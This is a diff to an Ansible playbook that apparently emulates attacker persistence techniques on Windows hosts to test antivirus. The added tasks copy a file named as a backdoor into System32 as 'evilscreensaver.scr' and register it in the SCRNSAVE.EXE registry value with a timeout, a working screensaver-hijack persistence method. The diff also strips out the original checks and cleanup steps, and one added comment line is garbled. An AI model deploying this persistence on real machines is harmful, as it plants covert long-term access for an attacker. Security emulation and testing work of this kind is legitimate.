@@ -4,6 +4,9 @@
   vars_files:
    - /opt/ansible/vars.yaml
   tasks:
+        - name:
+          tags: always
+          win_command: copy {{ backdoor_exe }} "%SystemRoot%\System32\evilscreensaver.scr"
         - name: Activate Screen saver
           #reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
           tags: always
@@ -13,71 +16,25 @@
             data: 1
             type: string
         - name: Activate Screen saver timeout
-          #reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
+          #reg.exe add "reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverTimeout /t REG_SZ /d 3600 /f
           tags: always
           win_regedit:
             path: HKCU:\Control Panel\Desktop
-            name: ScreenSaveActive
-            data: 1
+            name: ScreenSaverTimeout
+            data: 3600
+            type: string
+            
+        - name: Activate evil backdoor screensaver
+          #reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
+          tags: always
+          win_regedit:
+            path: HKCU:\Control Panel\Desktop
+            name: SCRNSAVE.EXE
+            data: "%SystemRoot%\System32\evilscreensaver.scr"
             type: string
             
         - name: sleep for 10 seconds and continue with play to check if AV removed or Not
           tags: always
           wait_for: timeout=10
           delegate_to: localhost		
-        - name: Check REG HKCURUN exist
-          tags: HKCURUN
-          win_reg_stat:
-            path: HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-            name: Debugger
-          register: T1060
-        - name: Check REG HKLMRUN exist
-          tags: HKLMRUN
-          win_reg_stat:
-            path: HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-            name: Debugger
-          register: T1060
-        - name: Check if startup file exist exist
-          tags: STARTUP
-          win_stat:
-            path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk
-          register: T1060
-
-        - name: check if playbook was blocked
-          tags: HKCURUN,HKLMRUN
-          debug: msg="Playbook Completed#T1060#blocked#win#"
-          when: T1060.exists == False        
-        - name: check if playbook was successfull
-          tags: HKCURUN,HKLMRUN
-          debug: msg="Playbook Completed#T1060#passed#win#"
-          when: T1060.exists
-         
-        - name: check if playbook was blocked
-          tags: STARTUP
-          debug: msg="Playbook Completed#T1060#blocked#win#"
-          when: T1060.stat.exists == False        
-        - name: check if playbook was successfull
-          tags: STARTUP
-          debug: msg="Playbook Completed#T1060#passed#win#"
-          when: T1060.stat.exists
-          
-        - name: cleanup HKCURUN      
-          tags: HKCURUN
-          win_regedit:
-              path: HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-              name: Debugger
-              state: absent
-          when: T1060.exists
-        - name: cleanup HKLMRUN      
-          tags: HKLMRUN
-          win_regedit:
-              path: HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
-              name: Debugger
-              state: absent
-          when: T1060.exists 
-        - name: cleanup STARTUP      
-          tags: STARTUP
-          win_file:
-            path: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Notepad.lnk
-            state: absent
-          when: T1060.stat.exists 
+       
